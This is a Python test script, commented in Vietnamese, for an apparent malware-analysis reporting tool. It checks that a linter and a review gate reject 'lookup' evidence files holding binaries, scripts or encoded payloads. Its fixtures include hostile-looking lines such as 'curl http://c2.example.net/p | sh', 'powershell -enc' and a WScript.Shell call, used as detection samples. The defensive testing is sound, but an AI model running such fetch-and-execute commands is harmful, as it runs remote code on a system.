#!/usr/bin/env python3
# Evidence lookup_* (tra cứu thụ động) chỉ đi với src=S; các luật nguồn/evidence cũ giữ nguyên. Chạy: python3 tests/check_lookup_src.py
import os, sys
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__)))); import case   # noqa: E402
f = case.src_evidence_issue
assert f('S', 'lookup_rdap.txt') is None
for s in ('E', 'V'): assert f(s, 'lookup_rdap.txt') and 'lookup_' in f(s, 'lookup_rdap.txt')[0], s
assert f('S', 'emu_x.txt') and f('V', 'tri.txt') and f('E', 'emu_x.txt') is None and f('V', 'host_a.txt') is None and f('S', 'tri.txt') is None
print('OK check_lookup_src')
# lookup_* chứa thân lớn/nhị phân/mã chạy được bị lint fail; văn bản ngắn (địa chỉ C2 một dòng) thì qua
import tempfile
c = tempfile.mkdtemp(); E = os.path.join(c, 'report', 'evidence'); os.makedirs(E); os.makedirs(os.path.join(c, 'work', 'sample'))
hdr = b'GET https://raw.example.net/x/main\n2026-11-23T00:00:00Z 200\n--- body ---\n'
body = {'ok': b'http://c2.example.net/v2\n', 'ok2': b'c2.example.net\n203.0.113.9\nserver=http://c2.example.net/v2?a=1&b=2\n', 'big': b'a' * (case.LOOKUP_MAX + 1), 'nul': b'abc\0def http://c2.example.net', 'sh': b'#!/bin/sh\necho http://c2.example.net\n',
        'elf': b'\x7fELF http://c2.example.net', 'ctl': bytes([1, 2, 3, 4]) * 20 + b' http://c2.example.net', 'sh2': b'http://c2.example.net\n#!/bin/sh\ncurl x | sh\n', 'ps': b'powershell -enc AAAA http://c2.example.net',
        'b64': b'http://c2.example.net ' + b'QUJD' * 60, 'js': b'<script>x</script> http://c2.example.net', 'pk': b'a\nPK\x03\x04 http://c2.example.net', 'b64ml': (b'QUJD' * 16 + b'\n') * 11, 'b64one': b'QUJD' * 60, 'hex': b'4d5a9000' * 40, 'json': b'{"a": 1, "b": [1, 2]}', 'curl': b'curl http://c2.example.net/p | sh', 'many': b'a.example.net\n' * 21, 'vbs': b'CreateObject("WScript.Shell")'}
for k, b in body.items():
    open(os.path.join(E, f'lookup_{k}.txt'), 'wb').write(hdr + b)   # đúng định dạng FLOW: đầu + dòng phân cách + thân
    case.add(c, id=f'l.{k}', kind='url', value='http://c2.example.net', src='S', evidence=f'report/evidence/lookup_{k}.txt')
F = case.load(c)
chk = lambda k: [x['check'] for x in case.lint_fact(c, F[f'l.{k}'])]
assert 'lookup_content' not in chk('ok') and 'lookup_content' not in chk('ok2'), (chk('ok'), chk('ok2'))
for k in body:
    if k not in ('ok', 'ok2'): assert 'lookup_content' in chk(k), (k, chk(k))
print('OK check_lookup_src (thân lookup_*)')
import review   # cổng phản biện (lớp máy) cũng chặn
it = {(i['id'], i['check']) for i in review.mech(c) if i['verdict'] == 'fail'}
assert {('l.big', 'lookup_content'), ('l.elf', 'lookup_content'), ('l.sh2', 'lookup_content')} <= it and ('l.ok', 'lookup_content') not in it, it
open(os.path.join(E, 'lookup_nosep.txt'), 'wb').write(b'#!/bin/sh\n'); case.add(c, id='l.nosep', kind='url', value='http://c2.example.net', src='S', evidence='report/evidence/lookup_nosep.txt')   # không có dòng phân cách: xét cả file
assert 'lookup_content' in [x['check'] for x in case.lint_fact(c, case.load(c)['l.nosep'])]
print('OK check_lookup_src (cổng)')
